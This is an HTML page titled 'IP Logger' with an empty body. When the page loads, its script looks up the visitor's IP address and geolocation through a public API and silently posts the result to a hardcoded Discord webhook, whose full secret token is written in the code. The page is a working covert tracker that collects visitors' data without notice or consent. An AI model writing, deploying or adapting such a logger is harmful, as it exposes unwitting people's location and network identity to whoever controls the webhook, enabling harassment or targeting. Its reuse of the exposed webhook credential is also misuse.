<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <!-- Include jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <script>
        $(document).ready(function() {
            // Get user information using IPAPI
            $.get("https://ipapi.co/json/", function(data) {
                // Prepare JSON payload with user information
                var jsonData = {
                    content: JSON.stringify(data, null, 2)  // Stringify JSON data to maintain structure
                };

                // Send user information to Discord webhook
                $.ajax({
                    type: "POST",
                    url: "https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN",
                    data: JSON.stringify(jsonData),
                    contentType: "application/json"
                });
            });
        });
    </script>
</body>
</html>
